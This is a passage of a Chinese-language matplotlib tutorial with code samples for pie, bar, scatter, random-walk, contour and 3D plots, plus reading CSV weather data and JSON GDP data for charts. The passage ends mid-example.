data = [0.16881, 0.14966, 0.07471, 0.06992, 0.04762, 0.03541, 0.02925, 0.02411, 0.02316, 0.01409, 0.36326]
labels = ['Java', 'C', 'C++', 'Python', 'Visual Basic .NET', 'C#', 'PHP', 'JavaScript', 'SQL', 'Assembly langugage', 'others']
explode = [0, 0, 0, 0.3, 0, 0, 0, 0, 0, 0, 0]       # 将第4个语言(Python)分离出来
colors=['red', 'pink', 'magenta','purple','orange'] # 使用自定义颜色
plt.axes(aspect='equal')                            # 将横、纵坐标轴标准化处理,保证饼图是一个正圆,否则为椭圆
plt.xlim(0,8)                                       # 控制X轴和Y轴的范围(用于控制饼图的圆心半径)
plt.ylim(0,8)

plt.pie(                  # 绘制饼图
    x = data,             # 绘图数据
    labels=labels,        # 添加编程语言标签
    explode=explode,      # 突出显示Python
    colors=colors,        # 设置饼图的自定义填充色
    autopct='%.3f%%',     # 设置百分比的格式,此处保留3位小数
    pctdistance=0.8,      # 设置百分比标签与圆心的距离
    labeldistance = 1.15, # 设置标签与圆心的距离
    startangle = 180,     # 设置饼图的初始角度
    center = (4, 4),      # 设置饼图的圆心(相当于X轴和Y轴的范围)
    radius = 3.8,         # 设置饼图的半径(相当于X轴和Y轴的范围)
    counterclock = False, # 是否逆时针,这里设置为顺时针方向
    wedgeprops = {'linewidth': 1, 'edgecolor':'green'}, # 设置饼图内外边界的属性值
    textprops = {'fontsize':12, 'color':'black'},       # 设置文本标签的属性值
    frame = 1                                           # 是否显示饼图的圆圈,此处设为显示
)
# 不显示X轴和Y轴的刻度值
plt.xticks(())
plt.yticks(())
plt.title('2018.8 list')
plt.show()

</textarea><textarea>
import matplotlib.pyplot as plt

# Pie chart, where the slices will be ordered and plotted counter-clockwise:
labels = 'Frogs', 'Hogs', 'Dogs', 'Logs'
sizes = [15, 30, 45, 10]
explode = (0, 0.1, 0, 0)  # only "explode" the 2nd slice (i.e. 'Hogs')

fig1, ax1 = plt.subplots()
ax1.pie(sizes, explode=explode, labels=labels, autopct='%1.1f%%', shadow=True, startangle=90)
ax1.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle.
plt.savefig('./plt.png')

</textarea><pre>
bar和barh函数绘制柱状图、条形图
使用Matplotlib提供的bar()函数来绘制柱状图。与plot()函数类似,程序每次调用bar()函数时都会生成一组柱状图,可通过多次调用bar()函数来生成多组柱状图

在使用bar()函数绘制柱状图时,默认不会在柱状图上显示具体的数值。为了能在柱状图上显示具体的数值,程序可以调用text()函数在数据图上输出文字
在使用text()函数输出文字时,该函数的前两个参数控制输出文字的X、Y坐标,第三个参数则控制输出的内容。其中va参数控制文字的垂直对齐方式,ha参数控制文字的水平对齐方式

</pre><textarea>
import numpy as np
import matplotlib.pyplot as plt

#基本图形
n=12
X=np.arange(n)
Y1=(1-X/float(n))*np.random.uniform(0.5,1,n)
Y2=(1-X/float(n))*np.random.uniform(0.5,1,n)
plt.bar(X,+Y1,facecolor='#9999ff',edgecolor='white')
plt.bar(X,-Y2,facecolor='#ff9999',edgecolor='white')

#标记值
for x,y in zip(X,Y1):#zip表示可以传递两个值
    plt.text(x+0.4,y+0.05,'%.2f'%y,ha='center',va='bottom')#ha表示横向对齐 bottom表示向下对齐
for x,y in zip(X,Y2):
    plt.text(x+0.4,-y-0.05,'%.2f'%y,ha='center',va='top')
plt.xlim(-0.5,n)
plt.xticks(())#忽略xticks
plt.ylim(-1.25,1.25)
plt.yticks(())#忽略yticks
plt.savefig('./plt.png')

</textarea><textarea>
import matplotlib.pyplot as plt
x_data = ['2012', '2013', '2014', '2015', '2016', '2017', '2018']
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
plt.bar(x=x_data, height=y_data, label='C', color='steelblue', alpha=0.8)  # 设置组柱状图的颜色和透明度
plt.bar(x=x_data, height=y_data2, label='Java', color='indianred', alpha=0.8)
# 在柱状图上显示具体数值, ha参数控制水平对齐方式, va控制垂直对齐方式
for x, y in enumerate(y_data): plt.text(x, y + 100, '%s' % y, ha='center', va='bottom')
for x, y in enumerate(y_data2): plt.text(x, y + 100, '%s' % y, ha='center', va='top')
plt.title("Java vs Android")
plt.xlabel("years")
plt.ylabel("sales")
plt.legend()
plt.show()

</textarea><pre>
为了实现条柱井列显示的效果,首先分析条柱重叠在一起的原因。使用 Matplotlib 绘制柱状图时同样也需要 X 轴数据,本程序的 X 轴数据是元素为字符串的 list 列表,因此程序实际上使用各字符串的索引作为 X 轴数据。比如 '2011' 字符串位于列表的第一个位置,因此代表该条柱的数据就被绘制在 X 轴的刻度值1处(由于两个柱状图使用了相同的 X 轴数据,因此它们的条柱完全重合在一起)。

为了将多个柱状图的条柱并列显示,程序需要为这些柱状图重新计算不同的X轴数据。为了精确控制条柱的宽度,程序可以在调用bar()函数时传入width参数,这样可以更好地计算条柱的并列方式

</pre><textarea>
import matplotlib.pyplot as plt
import numpy as np
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
bar_width=0.3

# 将X轴数据改为使用range(len(x_data), 就是0、1、2...,这样第一个柱状图的各条柱恰好位于 0、1、2… 刻度值处
plt.bar(x=range(len(x_data)), height=y_data, label='C', color='steelblue', alpha=0.8, width=bar_width)
# 将X轴数据改为使用np.arange(len(x_data))+bar_width,就是bar_width、1+bar_width、2+bar_width...这样第二个柱状图的各条柱位于 0、1、2…刻度值的偏右一点bar_width处,这样就恰好与第一个柱状图的各条柱并列了
# plt.bar(x=np.arange(len(x_data))+bar_width, height=y_data2,label='Java', color='indianred', alpha=0.8, width=bar_width)
# 使用np.arange(len(x_data))+bar_width+0.05 作为 X 轴数据,因此两组柱状图的条柱之间会有 0.05 的距离
plt.bar(x=np.arange(len(x_data))+bar_width+0.05, height=y_data2, label='Java基础', color='indianred', alpha=0.8, width=bar_width)

# 该柱状图的X轴的刻度值变成0、1、2等值,为了让X轴的刻度值显示年份,程序可以调用xticks()函数重新设置X轴的刻度值
# 使用 x_data 为 X 轴设置刻度值,第一个参数用于控制各刻度值的位置,也就是bar_width/2、1+bar_width/2、2+bar_width/2等,这样这些刻度值将被恰好添加在两个条柱之间
plt.xticks(np.arange(len(x_data))+bar_width/2, x_data)

# 在柱状图上显示具体数值, ha参数控制水平对齐方式, va控制垂直对齐方式
for x, y in enumerate(y_data): plt.text(x, y + 100, '%s' % y, ha='center', va='bottom')
for x, y in enumerate(y_data2): plt.text(x+bar_width, y + 100, '%s' % y, ha='center', va='top')

plt.title("Java vs Android")
plt.xlabel("years")
plt.ylabel("sales")
plt.legend()
plt.show()

</textarea><pre>
Matplotlib绘制水平柱状图
调用Matplotlib的barh()函数可以生成水平柱状图。barh()函数的用法与bar()函数的用法基本一样,只是在调用barh()函数时使用y参数传入Y轴数据,使用width参数传入代表条柱宽度的数据

</pre><textarea>
import matplotlib.pyplot as plt
import numpy as np
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
bar_width=0.3
# Y轴数据使用range(len(x_data), 就是0、1、2...
plt.barh(y=range(len(x_data)), width=y_data, label='Java', color='steelblue', alpha=0.8, height=bar_width)
# Y轴数据使用np.arange(len(x_data))+bar_width,就是bar_width、1+bar_width、2+bar_width...这样就和第一个柱状图并列了
plt.barh(y=np.arange(len(x_data))+bar_width, width=y_data2, label='C', color='indianred', alpha=0.8, height=bar_width)
# 在柱状图上显示具体数值, ha参数控制水平对齐方式, va控制垂直对齐方式
for y, x in enumerate(y_data): plt.text(x+5000, y-bar_width/2, '%s' % x, ha='center', va='bottom')
for y, x in enumerate(y_data2): plt.text(x+5000, y+bar_width/2, '%s' % x, ha='center', va='bottom')

plt.yticks(np.arange(len(x_data))+bar_width/2, x_data) # 为Y轴设置刻度值
plt.title("Java vs C")
plt.xlabel("sales")
plt.ylabel("years")
plt.legend()
plt.show()

</textarea><pre>
利用pyplot模块的scatter函数绘制散点图
散点图和折线图需要的数组非常相似,区别是折线图会将各数据点连接起来;而散点图则只是描绘各数据点,并不会将这些数据点连接起来。

调用Matplotlib的scatter()函数来绘制散点图,该函数支持如下常用参数：
x：指定X轴数据。
y：指定Y轴数据。
s：指定散点的大小。
c：指定散点的颜色。
alpha：指定散点的透明度。
linewidths：指定散点边框线的宽度。
edgecolors：指定散点边框的颜色。
cmap：指定散点的颜色映射,会使用不同的颜色来区分散点的值
marker：指定散点的图形样式。应参数支持'.'(点标记)、','(像素标记)、'o'(圆形标记)、'v'(向下三角形标记)、'^'(向上三角形标记)、'<'(向左三角形标记)、'>'(向右三角形标记)、'1'(向下三叉标记)、'2'(向上三叉标记)、'3'(向左三叉标记)、'4'(向右三叉标记)、's'(正方形标记)、'p'(五地形标记)、'*'(星形标记)、'h'(八边形标记)、'H'(另一种八边形标记)、'+'(加号标记)、'x'(x标记)、'D'(菱形标记)、'd'(尖菱形标记)、'|'(竖线标记)、'_'(横线标记)等值。

</pre><textarea>
import matplotlib.pyplot as plt
import numpy as np
plt.figure()
x_data = np.linspace(-np.pi, np.pi, 64, endpoint=True)  # 定义从-pi到pi之间的数据,平均取64个数据点
# 将整个figure分成两行两列,第三个参数表示该图形放在第1个网格,沿着正弦曲线绘制散点图
plt.scatter(
    x_data,
    np.sin(x_data),
    c='purple',                     # 设置点的颜色
    s=50,                           # 设置点半径
    alpha = 0.5,                    # 设置透明度
    marker='p',                     # 设置使用五边形标记
    linewidths=1,                   # 设置边框的线宽
    edgecolors=['green', 'yellow']  # 设置边框的颜色
)
# 绘制第二个散点图(只包含一个起点),突出起点
plt.scatter(
    x_data[0],
    np.sin(x_data)[0],
    c='red', s=150, alpha = 1
)
# 绘制第三个散点图(只包含一个结束点),突出结束点
plt.scatter(
    x_data[63],
    np.sin(x_data)[63],
    c='black',s=150, alpha = 1
)
plt.gca().spines['right'].set_color('none')
plt.gca().spines['top'].set_color('none')
plt.gca().spines['bottom'].set_position(('data', 0))
plt.gca().spines['left'].set_position(('data', 0))
plt.title('正弦曲线的散点图')
plt.show()

</textarea>scatter函数绘制单个点<textarea>
import matplotlib.pyplot as plt
plt.scatter(2, 4, s=200)                    # 传递一对x和y坐标。它将在指定位置绘制一个点,参数s是设置绘制图形时使用的点的尺寸
plt.title("Square Numbers", fontsize=24)    # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)            # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)  # 指定Y坐标轴的标签,并设置标签字体大小
plt.tick_params(axis='both', labelsize=14)  # 参数axis值为both,代表要设置横纵的刻度标记,标记大小为14
plt.savefig('./plt.png')

</textarea>scatter函数绘制一系列点<textarea>
import matplotlib.pyplot as plt
x_values = [1, 2, 3, 4, 5]
y_values = [1, 4, 9, 16, 25]
plt.scatter(x_values, y_values, s=100)  # 传入两个列表,x_values的元素作为x坐标,y_values的元素作为y坐标,两个组合成一个点的坐标,所以一共有5个点
plt.title("Square Numbers", fontsize=24)    # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)            # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)  # 指定Y坐标轴的标签,并设置标签字体大小
plt.tick_params(axis='both', labelsize=14)  # 参数axis值为both,代表要设置横纵的刻度标记,标记大小为14
plt.savefig('./plt.png')

</textarea>自动计算Y轴的数据<textarea>
# 前面个两个实例挺简单,但也只是自定义的短列表,如果要绘制的点有很多,那么还手动写,所以写一个根据X轴的数据,自动计算Y轴的数据就省事很多了

import matplotlib.pyplot as plt
x_values = list(range(1, 1001))             # 利用range函数生成一个从1到1000的可迭代对象,然后强制转换为列表
y_values = [x ** 2 for x in x_values]       # 列表推导式,将x_values每个元素的值进行平方再逐一放入列表
plt.scatter(x_values, y_values, s=40)       # 在2.0.0版本后的matplotlib中,scatter()的实参edgecolor(数据点的轮廓)默认为'none',代表删除轮廓,可通过plt.scatter(x_values, y_values, s=40, edgecolor='red')修改后的代码指定数据点轮廓的颜色为红色,由于默认点的颜色为蓝色,所以只有右上角是蓝色,其他都是红色,这是因为绘制很多点,红色轮廓都粘连在一起了,所以看不出来
plt.title("Square Numbers", fontsize=24)    # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)            # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)  # 指定Y坐标轴的标签,并设置标签字体大小
plt.axis([0, 1100, 0, 1100000])             # 设置每个坐标轴的取值范围。其实最右侧就是1100,但是没有显示标签而已
plt.savefig('./plt.png')

# 默认数据点的颜色为蓝色,也可以通过参数c修改数据点的颜色,至于颜色值可以采用直接写颜色英文如'red'、'black'等,或使用RGB颜色模式自定义颜色,这个自定义颜色设置为一个元组,其中包含三个0~1之间的小数值分别表示红色、绿色和蓝色分量,如(0,0,0.8)。可以通过下面这样修改代码：

import matplotlib.pyplot as plt
x_values = list(range(1, 1001))
y_values = [x ** 2 for x in x_values]
plt.scatter(x_values, y_values, c=(0, 0.8, 0), s=40)  # 指定了c参数,使用的是RGB颜色值方式
plt.title("Square Numbers", fontsize=24)              # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)                      # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)            # 指定Y坐标轴的标签,并设置标签字体大小
plt.axis([0, 1100, 0, 1100000])                       # 设置每个坐标轴的取值范围。其实最右侧就是1100,但是没有显示标签而已
plt.savefig('./plt.png')

</textarea>使用颜色映射和自动保存图表<textarea>
import matplotlib.pyplot as plt
x_values = [1, 2, 3, 4, 5]                    # 含x值的列表
y_values = [1, 4, 2, 6, 5]                    # 含y值的列表
# 根据上面两个列表调用scatter可以绘制一系列的点,模块pyplot内置了一组颜色映射,通过设置c参数为y列表的值,然后利用参数cmap根据y列表的大小映射到由x_values和y_values组成的五个点从浅到深的颜色,可以看出y列表[1,2,3,4,5]分别映射到(1,1),(2,4),(3,2),(4,6),(5,5)五个点,其中(1,1)点颜色最浅,(5,5)点颜色最深。
plt.scatter(x_values, y_values, c=[1, 2, 3, 4, 5], cmap=plt.cm.Blues, s=100)
plt.title("Square Numbers", fontsize=24)      # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)              # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)    # 指定Y坐标轴的标签,并设置标签字体大小
plt.savefig("./plt.png", bbox_inches='tight') # 让程序自动将图表保存到文件中,bbox_inches='tight'将图表多余的空白区域裁剪掉,明显更符合用户需求,如果没指定生成的图片显示不出Y轴的标签。

修改代码：
plt.scatter(x_values, y_values, c=[1, 5, 3, 4, 5], cmap=plt.cm.Blues, s=100) # (2,4)点的颜色也变成深蓝色

# 蓝色彗星的残影
import matplotlib.pyplot as plt
x_values = list(range(1,1001))                 # 含x值的列表
y_values = [x ** 2 for x in x_values]          # 含y值的列表
# 调用scatter可以绘制一系列的点
# 根据y列表的值大小进行颜色映射的,值大的颜色深,值小的颜色浅。如果y列表的值按顺序,并且映射到按顺序的点,那么自然颜色也是从浅到深。
# 模块pyplot内置了一组颜色映射,通过设置c参数为y列表的值,然后利用参数cmap根据y列表的大小映射到由x_values和y_values组成的五个点从浅到深的颜色,可以看出y列表分别映射到(1,1),(2,4),(3,2),(4,6),(5,5)五个点,其中(1,1)点颜色最浅,(5,5)点颜色最深。
plt.scatter(x_values, y_values, c=y_values, cmap=plt.cm.Blues, s=40)
plt.title("Square Numbers", fontsize=24)       # 指定标题,并设置标题字体大小
plt.xlabel("Value", fontsize=14)               # 指定X坐标轴的标签,并设置标签字体大小
plt.ylabel("Square of Value", fontsize=14)     # 指定Y坐标轴的标签,并设置标签字体大小
plt.savefig("./plt.png", bbox_inches='tight')  # 打开matplotlib查看器,并显示绘制的图形

</textarea><pre>
利用pyplot模块的scatter函数绘制随机漫步图
随机漫步：每次行走都完全是随机的,没有明确的方向,结果是由一系列随机决策决定的,为了实现随机漫步,需要做以下几步就可以完成：
1.创建RandomWalk类来生成随机漫步数据
2.利用获取的随机漫步数据绘制随机漫步图
3.模拟多次随机漫步
4.设置随机漫步图的样式

</pre><textarea>
from random import choice
import matplotlib.pyplot as plt

# 一个生成随机漫步数据的类
class RandomWalk:
    # 默认为5000个点,代表5000步
    def __init__(self, num_points=5000):
        self.num_points = num_points
        self.x_values = [0]
        self.y_values = [0]

    # 获取随机方向和步数的乘积
    def get_step(self):
        return choice([1, -1]) * choice([0, 1, 2, 3, 4])

    def fill_walk(self):
        while len(self.x_values) < self.num_points:
            # 获取往哪个方向走几步
            x_step = self.get_step()
            y_step = self.get_step()

            # 如果原地踏步则continue处理
            if x_step == 0 and y_step == 0:
                continue

            # 计算下一步走的位置
            next_x = self.x_values[-1] + x_step
            next_y = self.y_values[-1] + y_step
            # 将下一次走的位置保存在列表中
            self.x_values.append(next_x)
            self.y_values.append(next_y)

'''
# 1、利用获取的随机漫步数据绘制随机漫步图
rw = RandomWalk(5000)  # 创建一个RandomWalk实例,并指定走5000步
rw.fill_walk()         # 开始获取随机漫步数据,其实获取的是两个包含x和y值的数据点列表
plt.scatter(rw.x_values, rw.y_values, s=15)
plt.savefig("./plt.png", bbox_inches='tight')
'''

'''
# 2、模拟多次随机漫步
while True:
    rw = RandomWalk(5000)
    rw.fill_walk()
    plt.scatter(rw.x_values, rw.y_values,s=15)
    plt.savefig("./plt.png", bbox_inches='tight')

    keep_running = input("Make another walk?(y/n):")
    if keep_running == 'n':
        break
'''

# 3、设置随机漫步图的样式,定制一个好看的随机漫步图,有给点着色、重新绘制起点和终点、隐藏坐标轴、调整尺寸以适合屏幕
while True:
    rw = RandomWalk(5000)
    rw.fill_walk()

    plt.figure(figsize=(20, 6))
    # 颜色映射就是用列表赋值给c,而这个列表的值可以随意,大的代表颜色深,小的代表颜色浅。
    point_number = list(range(rw.num_points))  # [0-4999]
    plt.scatter(rw.x_values, rw.y_values, c=point_number, cmap=plt.cm.Blues, s=4)
    # 突出起点和终点,点变大,用不同颜色来显示起点和终点
    plt.scatter(0, 0, c='green', s=100)
    plt.scatter(rw.x_values[-1], rw.y_values[-1], c='red', s=100)

    # 隐藏坐标轴
    plt.axes().get_xaxis().set_visible(False)
    plt.axes().get_yaxis().set_visible(False)

    plt.savefig("./plt.png", bbox_inches='tight')

    keep_running = input("Make another walk?(y/n):")
    if keep_running == 'n': break

</textarea>利用matplotlib打印出图像<textarea>
import os
from PIL import Image
import matplotlib.pyplot as plt

img = Image.open('dog.jpg')

plt.figure("Image") # 图像窗口名称
plt.imshow(img)
plt.axis('on')      # 关掉坐标轴为 off
plt.title('image')  # 图像题目
plt.savefig("./plt.png", bbox_inches='tight')

</textarea>网格<textarea>
from pylab import *

axes = gca()
axes.set_xlim(0,4)
axes.set_ylim(0,3)
axes.set_xticklabels([])
axes.set_yticklabels([])

</textarea><pre>
contour和contourf：绘制等高线
等高线图需要的是三维数据,其中X、Y轴数据决定坐标点,还需要对应的高度数据(相当于Z轴数据)来决定不同坐标点的高度。
有了合适的数据之后,程序调用contour()函数绘制等高线,调用contourf()函数为等高线图填充颜色。

在调用contour()、contourf()函数时可以指定如下常用参数：
x：指定X轴数据。
y：指定Y轴数据。
z：指定X、Y坐标对应点的高度数据。
colors：指定不同高度的等高线的颜色。
alpha：指定等高线的透明度。
cmap：指定等高线的颜色映射,即自动使用不同的颜色来区分不同的高度区域。
linewidths：指定等高线的宽度。
linestyles：指定等高线的样式。

</pre><textarea>
import matplotlib.pyplot as plt
import numpy as np
delta = 0.025
# 生成代表X轴数据的列表
x = np.arange(-3.0, 3.0, delta)
# 生成代表Y轴数据的列表
y = np.arange(-2.0, 2.0, delta)
# 对x、y数据执行网格化
X, Y = np.meshgrid(x, y)
Z1 = np.exp(-X**2 - Y**2)
Z2 = np.exp(-(X - 1)**2 - (Y - 1)**2)
# 计算Z轴数据(高度数据)
Z = (Z1 - Z2) * 2
# 为等高线图填充颜色, 16指定将等高线分为几部分
plt.contourf(x, y, Z, 16, alpha = 0.75, cmap='rainbow')  # 使用颜色映射来区分不同高度的区域
# 绘制等高线
C = plt.contour(x, y, Z, 16, colors = 'black', linewidth = 0.5) # 指定等高线的线宽
# 绘制等高线数据
plt.clabel(C, inline = True, fontsize = 10)
# 去除坐标轴
plt.xticks(())
plt.yticks(())
plt.title("等高线图")
plt.xlabel("纬度")
plt.ylabel("经度")
plt.show()

</textarea><pre>
plot_surface(Axes3D)方法：绘制3D图形
3D图形需要的数据与等高线图基本相同：X、Y数据决定坐标点,Z轴数据决定X、Y坐标点对应的高度。与等高线图使用等高线来代表高度不同,3D图形将会以更直观的形式来表示高度。

为了绘制3D图形,需要调用Axes3D对象的plot_surface()方法来完成

</pre><textarea>
import matplotlib.pyplot as plt
import numpy as np
from mpl_toolkits.mplot3d import Axes3D
fig = plt.figure(figsize=(12, 8))
ax = Axes3D(fig)
# 程序开始准备了和前一个程序相同的数据,只是该程序将delta设置为0.125,这样可以避免生成太多的数据点,在绘制3D图形时,计算开销较大,如果数据点太多, Matplotlib将会很卡
delta = 0.125
# 生成代表X轴数据的列表
x = np.arange(-3.0, 3.0, delta)
# 生成代表Y轴数据的列表
y = np.arange(-2.0, 2.0, delta)
# 对x、y数据执行网格化
X, Y = np.meshgrid(x, y)
Z1 = np.exp(-X**2 - Y**2)
Z2 = np.exp(-(X - 1)**2 - (Y - 1)**2)
# 计算Z轴数据(高度数据)
Z = (Z1 - Z2) * 2
# 绘制3D图形
ax.plot_surface(X, Y, Z,
    rstride=1,  # rstride(row)指定行的跨度
    cstride=1,  # cstride(column)指定列的跨度
    cmap=plt.get_cmap('rainbow'))  # 设置颜色映射
# 设置Z轴范围
ax.set_zlim(-2, 2)
# 设置标题
plt.title("3D图")
plt.show()

</textarea>3D图像<textarea>
import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D  #需另外导入模块Axes 3D
fig=plt.figure()    #定义图像窗口
ax=Axes3D(fig)      #在窗口上添加3D坐标轴
# 将X和Y值编织成栅格
X=np.arange(-4,4,0.25)
Y=np.arange(-4,4,0.25)
X,Y=np.meshgrid(X,Y)
R=np.sqrt(X**2+Y**2)
Z=np.sin(R) #高度值
#将colormap rainbow填充颜色, 之后将三维图像投影到XY平面做等高线图, 其中ratride和cstride表示row和column的宽度
ax.plot_surface(X,Y,Z,rstride=1,cstride=1,cmap=plt.get_cmap('rainbow'))#rstride表示图像中分割线的跨图
#添加XY平面等高线 投影到z平面
ax.contourf(X,Y,Z,zdir='z',offset=-2,cmap=plt.get_cmap('rainbow'))#把图像进行投影的图形 offset表示比0坐标轴低两个位置
ax.set_zlim(-2,2)
plt.savefig("./plt.png", bbox_inches='tight')

</textarea><pre>
【 Python读取csv文件 】
实际应用需要展示不同来源(比如文件、网络)、不同格式(比如 csv、JSON)的数据,这些数据可能有部分是损坏的,因此程序需要对这些数据进行处理。

csv文件格式的本质是一种以文本存储的表格数据,使用Excel即可读写csv文件,csv文件的每行代表一行数据,每行数据中每个单元格内的数据以逗号隔开。

Python提供了csv模块来读写csv文件。由于csv文件的格式本身比较简单,通常第一行是表头用于说明每列数据的含义,接下来每行代表一行数据,因此使用csv模块读取csv文件也非常简单：
创建csv模块的读取器。
循环调用csv读取器的next()方法逐行读取csv文件内容即可。next()方法返回一个list列表代表一行数据,list列表的每个元素代表一个单元格数据。

</pre><textarea>
Date, Max TemperatureC, Min TemperatureC, Description, WindDir, WindForce
2019-1-1, 24, 13, 晴, 西南风, 1级
2019-1-2, 26, 10, 晴, 西南风, 2级
2019-1-3, 29, 9, 晴, 西南风, 1级
2019-1-4, 28, 11, 晴, 西南风, 1级
2019-1-5, 25, 13, 晴, 西南风, 2级
2019-1-6, 23, 15, 晴, 西南风, 1级
2019-1-7, 26, 16, 晴, 西南风, 1级

import csv
filename = 'weather-2019.csv'
with open(filename) as f:
    reader = csv.reader(f)    # 创建cvs文件读取器
    header_row = next(reader) # 读取第一行,这行是表头数据。
    print(header_row)
    first_row = next(reader)  # 读取第二行,这行是真正的数据。
    print(first_row)

['Date', ' Max TemperatureC', ' Min TemperatureC', ' Description', ' WindDir', ' WindForce']
['2017-1-1', ' 24', ' 13', ' 晴', ' 西南风', ' 1级']

</textarea><textarea>
import csv
from datetime import datetime
from matplotlib import pyplot as plt
filename = 'weather-2019.csv'
with open(filename) as f:
    reader = csv.reader(f)    # 创建cvs文件读取器
    header_row = next(reader) # 读取第一行,这行是表头数据。
    print(header_row)
    start_date = datetime(2019, 1, 1)  # 定义读取起始日期
    end_date = datetime(2019, 1, 7)    # 定义结束日期
    dates, highs, lows = [], [], []    # 定义3个list列表作为展示的数据
    for row in reader:
        d = datetime.strptime(row[0], '%Y-%m-%d') # 将第一列的值格式化为日期
        if start_date <= d <= end_date:
            dates.append(d)
            highs.append(int(row[1]))
            lows.append(int(row[2]))

fig = plt.figure(dpi=128, figsize=(12, 9)) # 配置图形
plt.plot(dates, highs, c='red', label='最高气温', alpha=0.5, linewidth = 2.0, linestyle = '-', marker='v')
plt.plot(dates, lows, c='blue', label='最低气温', alpha=0.5, linewidth = 3.0, linestyle = '-.', marker='o')
plt.fill_between(dates, highs, lows, facecolor='blue', alpha=0.1) # 为两个数据的绘图区域填充颜色
plt.title("广州2019年1月最高气温和最低气温")  # 设置标题
plt.xlabel("日期")                          # 为两条坐标轴设置名称
fig.autofmt_xdate()                         # 该方法绘制斜着的日期标签
plt.ylabel("气温(℃)")
plt.legend()                               # 显示图例
ax = plt.gca()
ax.spines['right'].set_color('none')       # 设置右边坐标轴线的颜色(设置为none表示不显示)
ax.spines['top'].set_color('none')         # 设置顶部坐标轴线的颜色(设置为none表示不显示)
plt.show()

</textarea>使用pygal.Pie对象绘制饼图来统计2019年天气汇总情况,比如统计出阴天、晴天、多云天和雨天各占多少天<textarea>
import csv
import pygal
filename = 'weather-2019.csv'
with open(filename) as f:
    reader = csv.reader(f)    # 创建cvs文件读取器
    header_row = next(reader) # 读取第一行,这行是表头数据。
    print(header_row)
    # 准备展示的数据
    shades, sunnys, cloudys, rainys = 0, 0, 0, 0
    for row in reader:
        if '阴' in row[3]: shades += 1
        elif '晴' in row[3]: sunnys += 1
        elif '云' in row[3]: cloudys += 1
        elif '雨' in row[3]: rainys += 1
        else: print(rows[3])
# 创建pygal.Pie对象(饼图)
pie = pygal.Pie()
# 为饼图添加数据
pie.add("阴", shades)
pie.add("晴", sunnys)
pie.add("多云", cloudys)
pie.add("雨", rainys)
pie.title = '2019年广州天气汇总'
# 指定将数据图输出到SVG文件中
pie.render_to_file('pygal.svg')

</textarea><pre>
【 读取JSON文件 】
[
{"Country Code":"JPN","Country Name":"japanse","Value":25760683041.0857,"Year":2016},
{"Country Code":"JPN","Country Name":"japanse","Value":28434203615.4829,"Year":2017},
{"Country Code":"JPN","Country Name":"japanse","Value":29860683041.0857,"Year":2018},
{"Country Code":"CHN","Country Name":"China","Value":31234203615.4829,"Year":2016},
{"Country Code":"CHN","Country Name":"China","Value":32960683041.0857,"Year":2017},
{"Country Code":"CHN","Country Name":"China","Value":35334203615.4829,"Year":2018},
{"Country Code":"RUS","Country Name":"Russian","Value":32234203615.4829,"Year":2016},
{"Country Code":"RUS","Country Name":"Russian","Value":33660683041.0857,"Year":2017},
{"Country Code":"RUS","Country Name":"Russian","Value":33834203615.4829,"Year":2018},
{"Country Code":"USA","Country Name":"American","Value":36234203615.4829,"Year":2016},
{"Country Code":"USA","Country Name":"American","Value":36860683041.0857,"Year":2017},
{"Country Code":"USA","Country Name":"American","Value":37234203615.4829,"Year":2018},
{"Country Code":"CAN","Country Name":"Canada","Value":31634203615.4829,"Year":2016},
{"Country Code":"CAN","Country Name":"Canada","Value":32860683041.0857,"Year":2017},
{"Country Code":"CAN","Country Name":"Canada","Value":33734203615.4829,"Year":2018}
]

上面的JSON格式数据被保存在方括号内,这些数据将会被转换为Python的list列表,而list列表的每个元素将会是一个dict对象

</pre><textarea>
import json
filename = 'gdp.json'
with open(filename) as f:
    gpd_list = json.load(f)
# 遍历列表的每个元素,每个元素是一个GDP数据项
for gpd_dict in gpd_list:
    # 只显示中国、2016年的GDP
    if gpd_dict['Year'] == 2016 and gpd_dict['Country Code'] == 'CHN':
        print(gpd_dict['Country Name'], gpd_dict['Value'])

</textarea>使用matplotlib柱状图展示各国GDP数据<textarea>
import json
from matplotlib import pyplot as plt
import numpy as np
filename = 'gdp.json'
# 读取JSON格式的GDP数据
with open(filename) as f:
    gpd_list = json.load(f)
# 使用list列表依次保存中国、美国、日本、俄罗斯、加拿大的GDP值
country_gdps = [{}, {}, {}, {}, {}]
country_codes = ['CHN', 'USA', 'JPN', 'RUS', 'CAN']
# 遍历列表的每个元素,每个元素是一个GDP数据项
for gpd_dict in gpd_list:
    for i, country_code in enumerate(country_codes):
        # 只读取指定国家的数据
        if gpd_dict['Country Code'] == country_code:
            year = gpd_dict['Year']
            # 只读取2001年到2016
            if 2018 >= year >= 2016:  country_gdps[i][year] = gpd_dict['Value']
# 使用list列表依次保存中国、美国、日本、俄罗斯、加拿大的GDP值
country_gdp_list = [[], [], [], [], []]
# 构建时间数据
x_data = range(2016, 2019)
for i in range(len(country_gdp_list)):
    for year in x_data:
        country_gdp_list[i].append(country_gdps[i][year] / 1e8) # 除以1e8,让数值变成以亿为单位
bar_width=0.15
fig = plt.figure(dpi=128, figsize=(15, 8))
colors = ['indianred', 'steelblue', 'gold', 'lightpink', 'seagreen']
countries = ['China', 'American', 'Janpanse', 'Russian', 'Cannada']  # 定义国家名称列表
# 采用循环绘制5组柱状图
